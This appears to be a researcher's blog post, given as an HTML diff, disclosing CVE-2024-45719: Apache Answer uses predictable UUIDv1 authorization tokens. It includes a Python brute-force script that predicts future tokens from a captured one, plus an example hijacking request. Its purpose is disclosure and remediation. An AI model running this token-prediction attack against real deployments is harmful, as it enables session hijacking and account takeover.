@@ -1,0 +1,898 @@
+
+
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.28.1 by Michael Rose
+  Copyright 2013-2026 Michael Rose - mademistakes.com | @mmistakes
+  Copyright 2024-2026 iBug - ibugone.com | @iBug
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js" dir="ltr">
+  <head>
+    
+<meta charset="utf-8">
+
+
+<!-- begin _includes/seo.html --><title>CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer | iam.chi</title>
+<meta name="description" content="Overview">
+
+
+  <meta name="author" content="Chi Tran">
+  
+  <meta property="article:author" content="Chi Tran">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="iam.chi">
+<meta property="og:title" content="CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer">
+<meta property="og:url" content="http://localhost:4444/research/apache-answer-weak-uuid/">
+
+
+  <meta property="og:description" content="Overview">
+
+
+
+  <meta property="og:image" content="http://localhost:4444/images/site-preview.png">
+  
+
+
+
+  <meta name="twitter:site" content="@imspicynoodles">
+  <meta name="twitter:title" content="CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer">
+  <meta name="twitter:description" content="Overview">
+  <meta name="twitter:url" content="http://localhost:4444/research/apache-answer-weak-uuid/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4444/images/site-preview.png">
+      
+    
+  
+
+  
+
+
+
+
+
+  <meta property="article:published_time" content="2024-11-23T00:00:00-05:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4444/research/apache-answer-weak-uuid/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="iam.chi Feed">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- Site is dark-skin only (minimal_mistakes_skin: dark) — tell the browser so
+     native UI (form controls, scrollbars, mobile address bar) matches instead
+     of defaulting to light, and there's no light-mode flash before CSS loads. -->
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#252a34">
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    
+<nav class="skip-links" aria-label="Skip links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav" aria-label="Primary navigation">
+        
+        <a class="site-title" href="/">
+          iam.chi
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="https://ctrsec.io"
+                
+                
+              >All Posts</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+
+  <div class="sidebar sticky">
+  
+
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4444/">
+        <img src="/images/bio-photo.jpg" alt="Chi Tran" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4444/" itemprop="url">Chi Tran</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Senior Security Researcher, dad of two, and a former line cook who never stopped loving spicy noodles. I write up the vulnerabilities and other rabbit holes I stumble into.</p>
+
+<p><em>Opinions and research here are my own — not my employer’s, past or present.</em></p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:research@ctrsec.io" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="/files/Chi_Tran_Resume.pdf" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-file-pdf" aria-hidden="true"></i><span class="label">Resume</span></a></li>
+          
+        
+          
+            <li><a href="https://ctrsec.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Homepage</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer">
+    <meta itemprop="description" content="Overview">
+    <meta itemprop="datePublished" content="2024-11-23T00:00:00-05:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4444/research/apache-answer-weak-uuid/" itemprop="url">CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer
+</a>
+          </h1>
+          
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-23T00:00:00-05:00">November 23, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc" aria-label="Table of contents">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#overview">Overview</a></li><li><a href="#affected-systems">Affected systems</a></li><li><a href="#technical-details">Technical Details</a><ul><li><a href="#uuidv1-breakdown">UUIDv1 Breakdown</a><ul><li><a href="#implementation">Implementation</a></li><li><a href="#example-uuid-analysis">Example UUID Analysis</a></li></ul></li></ul></li><li><a href="#attack-scenario">Attack Scenario</a><ul><li><a href="#step-1-obtain-a-valid-uuid-token">Step 1: Obtain a Valid UUID Token</a></li><li><a href="#step-2-extract-predictable-components">Step 2: Extract Predictable Components</a></li><li><a href="#step-3-brute-force-future-tokens">Step 3: Brute Force Future Tokens</a></li></ul></li><li><a href="#real-world-feasibility">Real-World Feasibility</a></li><li><a href="#resolution-and-recommendations">Resolution and Recommendations</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="overview">Overview</h2>
+
+<p><code class="language-plaintext highlighter-rouge">CVE-20240-45719</code> highlights a critical vulnerability in Apache Answer, where UUID Version 1 (UUIDv1) is used as an authorization token. Due to the predictable nature of UUIDv1, attackers can predict and brute force valid tokens, enabling session hijacking and unauthorized access to user accounts.</p>
+
+<p>This vulnerability has been validated through real-world testing, demonstrating that an attacker with minimal privileges can exploit this flaw to hijack future user sessions at scale. Immediate remediation is essential to protect user accounts and system integrity.</p>
+
+<h2 id="affected-systems">Affected systems</h2>
+
+<p>All instances of <a href="https://answer.apache.org/">Apache Answer</a> where UUIDv1 is used as an authorization token are affected. This includes systems that rely on UUIDv1 for identifying and validating user sessions.</p>
+
+<h2 id="technical-details">Technical Details</h2>
+
+<p>In the Apache Answer codebase, UUIDv1 is used for generating authorization tokens. Below is an example of the relevant code, which demonstrates the usage of UUIDv1:</p>
+
+<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">import</span> <span class="p">(</span>
+  <span class="s">"github.com/google/uuid"</span>
+<span class="p">)</span>
+
+<span class="c">// GenerateAuthorizationToken generates a UUIDv1 token for user authorization</span>
+<span class="k">func</span> <span class="n">GenerateAuthorizationToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">NewUUID</span><span class="p">()</span><span class="o">.</span><span class="n">String</span><span class="p">()</span> <span class="c">// UUIDv1 generation</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Here, the <code class="language-plaintext highlighter-rouge">uuid.NewUUID()</code> function generates a UUID Version 1 token. While this ensures uniqueness, it lacks the cryptographic randomness required for security-critical use cases, such as session management or authorization.</p>
+
+<h3 id="uuidv1-breakdown">UUIDv1 Breakdown</h3>
+
+<h4 id="implementation">Implementation</h4>
+
+<ul>
+  <li>Reference: https://github.com/google/uuid/blob/master/version1.go</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="c">// NewUUID returns a Version 1 UUID based on the current NodeID and clock</span>
+<span class="c">// sequence, and the current time.  If the NodeID has not been set by SetNodeID</span>
+<span class="c">// or SetNodeInterface then it will be set automatically.  If the NodeID cannot</span>
+<span class="c">// be set NewUUID returns nil.  If clock sequence has not been set by</span>
+<span class="c">// SetClockSequence then it will be set automatically.  If GetTime fails to</span>
+<span class="c">// return the current NewUUID returns nil and an error.</span>
+<span class="c">//</span>
+<span class="c">// In most cases, New should be used.</span>
+<span class="k">func</span> <span class="n">NewUUID</span><span class="p">()</span> <span class="p">(</span><span class="n">UUID</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">var</span> <span class="n">uuid</span> <span class="n">UUID</span>
+  <span class="n">now</span><span class="p">,</span> <span class="n">seq</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">GetTime</span><span class="p">()</span>
+  <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">err</span>
+  <span class="p">}</span>
+
+  <span class="n">timeLow</span> <span class="o">:=</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">now</span> <span class="o">&amp;</span> <span class="m">0xffffffff</span><span class="p">)</span>
+  <span class="n">timeMid</span> <span class="o">:=</span> <span class="kt">uint16</span><span class="p">((</span><span class="n">now</span> <span class="o">&gt;&gt;</span> <span class="m">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="m">0xffff</span><span class="p">)</span>
+  <span class="n">timeHi</span> <span class="o">:=</span> <span class="kt">uint16</span><span class="p">((</span><span class="n">now</span> <span class="o">&gt;&gt;</span> <span class="m">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="m">0x0fff</span><span class="p">)</span>
+  <span class="n">timeHi</span> <span class="o">|=</span> <span class="m">0x1000</span> <span class="c">// Version 1</span>
+
+  <span class="n">binary</span><span class="o">.</span><span class="n">BigEndian</span><span class="o">.</span><span class="n">PutUint32</span><span class="p">(</span><span class="n">uuid</span><span class="p">[</span><span class="m">0</span><span class="o">:</span><span class="p">],</span> <span class="n">timeLow</span><span class="p">)</span>
+  <span class="n">binary</span><span class="o">.</span><span class="n">BigEndian</span><span class="o">.</span><span class="n">PutUint16</span><span class="p">(</span><span class="n">uuid</span><span class="p">[</span><span class="m">4</span><span class="o">:</span><span class="p">],</span> <span class="n">timeMid</span><span class="p">)</span>
+  <span class="n">binary</span><span class="o">.</span><span class="n">BigEndian</span><span class="o">.</span><span class="n">PutUint16</span><span class="p">(</span><span class="n">uuid</span><span class="p">[</span><span class="m">6</span><span class="o">:</span><span class="p">],</span> <span class="n">timeHi</span><span class="p">)</span>
+  <span class="n">binary</span><span class="o">.</span><span class="n">BigEndian</span><span class="o">.</span><span class="n">PutUint16</span><span class="p">(</span><span class="n">uuid</span><span class="p">[</span><span class="m">8</span><span class="o">:</span><span class="p">],</span> <span class="n">seq</span><span class="p">)</span>
+
+  <span class="n">nodeMu</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
+  <span class="k">if</span> <span class="n">nodeID</span> <span class="o">==</span> <span class="n">zeroID</span> <span class="p">{</span>
+    <span class="n">setNodeInterface</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="nb">copy</span><span class="p">(</span><span class="n">uuid</span><span class="p">[</span><span class="m">10</span><span class="o">:</span><span class="p">],</span> <span class="n">nodeID</span><span class="p">[</span><span class="o">:</span><span class="p">])</span>
+  <span class="n">nodeMu</span><span class="o">.</span><span class="n">Unlock</span><span class="p">()</span>
+
+  <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="no">nil</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>UUID Version 1 is structured as follows:</p>
+
+<ul>
+  <li>Timestamp (60 bits): Represents the number of 100-nanosecond intervals since October 15, 1582, derived directly from the system clock.</li>
+  <li>Clock Sequence (14 bits): Used to avoid duplicates within the same timestamp. However, it is relatively static unless the system clock changes or the server restarts.</li>
+  <li>Node Identifier (48 bits): Typically derived from the server’s MAC address, making it constant for the machine.</li>
+</ul>
+
+<h4 id="example-uuid-analysis">Example UUID Analysis</h4>
+
+<p>Given the UUID 70935f8d-6b50-11ef-9728-0242ac110002, the components can be broken down as follows:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">70935f8d</code>: Timestamp (lower 32 bits).</li>
+  <li><code class="language-plaintext highlighter-rouge">6b50</code>: Timestamp (middle 16 bits).</li>
+  <li><code class="language-plaintext highlighter-rouge">11ef</code>: Timestamp (upper 12 bits), combined with the version (1).</li>
+  <li><code class="language-plaintext highlighter-rouge">9728</code>: Clock sequence, which remains static across multiple tokens generated at the same time.</li>
+  <li><code class="language-plaintext highlighter-rouge">0242ac110002</code>: Node identifier (MAC address or equivalent).</li>
+</ul>
+
+<p>This predictable structure makes it possible for attackers to predict future tokens after capturing one valid UUID.</p>
+
+<h2 id="attack-scenario">Attack Scenario</h2>
+
+<h3 id="step-1-obtain-a-valid-uuid-token">Step 1: Obtain a Valid UUID Token</h3>
+<p>An attacker begins by obtaining a valid UUIDv1 authorization token. This can be achieved by:</p>
+<ul>
+  <li>Signing up for a low-privileged account.</li>
+  <li>Intercepting network traffic or logs containing tokens.</li>
+  <li>Example captured token:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>70935f8d-6b50-11ef-9728-0242ac110002
+</code></pre></div></div>
+
+<h3 id="step-2-extract-predictable-components">Step 2: Extract Predictable Components</h3>
+
+<ul>
+  <li>The attacker extracts:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Clock Sequence: 9728
+Node Identifier: 0242ac110002
+</code></pre></div></div>
+
+<ul>
+  <li>These components remain constant for the server, enabling the attacker to focus on brute-forcing the timestamp.</li>
+</ul>
+
+<h3 id="step-3-brute-force-future-tokens">Step 3: Brute Force Future Tokens</h3>
+<p>The attacker writes a script to iterate over possible timestamps while keeping the clock sequence and node identifier constant. The following Python script demonstrates this approach:</p>
+
+<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">import</span> <span class="n">uuid</span>
+<span class="n">from</span> <span class="n">datetime</span> <span class="k">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
+
+<span class="err">#</span> <span class="n">Known</span> <span class="n">components</span> <span class="n">from</span> <span class="n">the</span> <span class="n">captured</span> <span class="n">UUID</span>
+<span class="n">node</span> <span class="o">=</span> <span class="m">0x0242ac110002</span>
+<span class="n">clock_seq</span> <span class="o">=</span> <span class="m">0x9728</span>
+
+<span class="err">#</span> <span class="n">Start</span> <span class="n">timestamp</span> <span class="p">(</span><span class="n">replace</span> <span class="n">with</span> <span class="n">observed</span> <span class="n">login</span> <span class="n">time</span><span class="p">)</span>
+<span class="n">start_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="m">2024</span><span class="p">,</span> <span class="m">9</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="m">31</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="n">Brute</span> <span class="n">force</span> <span class="n">UUID</span> <span class="n">generation</span>
+<span class="n">def</span> <span class="n">generate_uuid</span><span class="p">()</span><span class="o">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="k">range</span><span class="p">(</span><span class="m">100000</span><span class="p">)</span><span class="o">:</span> 
+        <span class="n">timestamp</span> <span class="o">=</span> <span class="kt">int</span><span class="p">((</span><span class="n">start_time</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span> <span class="o">*</span> <span class="m">1e7</span><span class="p">)</span>
+        <span class="n">uuid_fields</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="p">(</span><span class="n">timestamp</span> <span class="o">&amp;</span> <span class="m">0xFFFFFFFF</span><span class="p">),</span>  <span class="err">#</span> <span class="n">time_low</span>
+            <span class="p">(</span><span class="n">timestamp</span> <span class="o">&gt;&gt;</span> <span class="m">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="m">0xFFFF</span><span class="p">,</span>  <span class="err">#</span> <span class="n">time_mid</span>
+            <span class="p">((</span><span class="n">timestamp</span> <span class="o">&gt;&gt;</span> <span class="m">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="m">0x0FFF</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="m">12</span><span class="p">),</span>  <span class="err">#</span> <span class="n">time_hi_and_version</span>
+            <span class="p">((</span><span class="n">clock_seq</span> <span class="o">&gt;&gt;</span> <span class="m">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="m">0x3F</span><span class="p">)</span> <span class="o">|</span> <span class="m">0x80</span><span class="p">,</span>  <span class="err">#</span> <span class="n">clock_seq_hi_and_reserved</span>
+            <span class="n">clock_seq</span> <span class="o">&amp;</span> <span class="m">0xFF</span><span class="p">,</span>  <span class="err">#</span> <span class="n">clock_seq_low</span>
+            <span class="n">node</span><span class="p">,</span>  <span class="err">#</span> <span class="n">node</span>
+        <span class="p">)</span>
+        <span class="n">yield</span> <span class="n">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">fields</span><span class="o">=</span><span class="n">uuid_fields</span><span class="p">))</span>
+
+<span class="err">#</span> <span class="n">Generate</span> <span class="n">and</span> <span class="nb">print</span> <span class="n">tokens</span>
+<span class="k">for</span> <span class="n">token</span> <span class="n">in</span> <span class="n">generate_uuid</span><span class="p">()</span><span class="o">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span></code></pre></figure>
+
+<h2 id="real-world-feasibility">Real-World Feasibility</h2>
+<p>For testing purposes, I used a 1-minute timestamp range. On a 32-core, 64GB RAM virtual machine, the script generated a valid token in 2-3 minutes. In real-world scenarios, the script can run continuously, capturing all future valid tokens generated by the system.</p>
+
+<p>Even if the server updates the clock sequence or node identifier, the attacker can simply capture a new token from their account and continue the attack.</p>
+
+<p>The attacker uses the generated tokens to send requests to the web application. For example:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /answer/api/v1/notification/page?type=achievement&amp;page=1&amp;page_size=10 HTTP/1.1
+Host: localhost:9080
+Authorization: &lt;Generated-UUID&gt;
+</code></pre></div></div>
+
+<p>A <code class="language-plaintext highlighter-rouge">200 OK</code> response confirms session hijacking.</p>
+
+<h2 id="resolution-and-recommendations">Resolution and Recommendations</h2>
+<p>The Apache Answer maintainers have addressed this vulnerability by upgrading the token generation mechanism in version <code class="language-plaintext highlighter-rouge">1.4.1</code>. Users are strongly advised to update their installations to Apache Answer <code class="language-plaintext highlighter-rouge">1.4.1</code> to mitigate the risk of account takeover.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+  
+
+  
+    
+
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#research" class="page__taxonomy-item p-category" rel="tag">Research</a>
+    
+    </span>
+  </p>
+
+
+  
+
+
+        
+
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-11-23T00:00:00-05:00">November 23, 2024</time></p>
+
+
+      </footer>
+
+      
+<section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://x.com/intent/tweet?via=imspicynoodles&text=CVE-2024-45719%3A+Predictable+Authorization+Token+Vulnerability+in+Apache+Answer%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-answer-weak-uuid%2F" class="btn btn--x" aria-label="Share on X" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on X">
+    <i class="fab fa-fw fa-x-twitter" aria-hidden="true"></i><span> X</span>
+  </a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-answer-weak-uuid%2F" class="btn btn--facebook" aria-label="Share on Facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook">
+    <i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span>
+  </a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4444/research/apache-answer-weak-uuid/" class="btn btn--linkedin" aria-label="Share on LinkedIn" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn">
+    <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span>
+  </a>
+
+  <a href="https://bsky.app/intent/compose?text=CVE-2024-45719%3A+Predictable+Authorization+Token+Vulnerability+in+Apache+Answer%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-answer-weak-uuid%2F" class="btn btn--bluesky" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Bluesky">
+    <i class="fab fa-fw fa-bluesky" aria-hidden="true"></i><span> Bluesky</span>
+  </a>
+</section>
+
+
+      
+
+  <nav class="pagination" aria-label="Post pagination">
+    
+      <a href="/research/apache-roller-csrf/" class="pagination--pager" title="CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/apache-roller-csrf/" rel="permalink">CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-10-12T00:00:00-04:00">October 12, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwning-the-scammer-new-zero-day/" rel="permalink">How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-06-24T00:00:00-04:00">June 24, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Friday night @ 9PM….
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwn2own-canon-bof-mf743cdw/" rel="permalink">[Pwn2Own 2022] CVE-2023-0855: Canon imageClass MF743CDW IPP BOF
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-05-22T00:00:00-04:00">May 22, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwning-the-samsung-tv/" rel="permalink">Pwning the Samsung TV
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-01-28T00:00:00-05:00">January 28, 2022</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        
+<div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
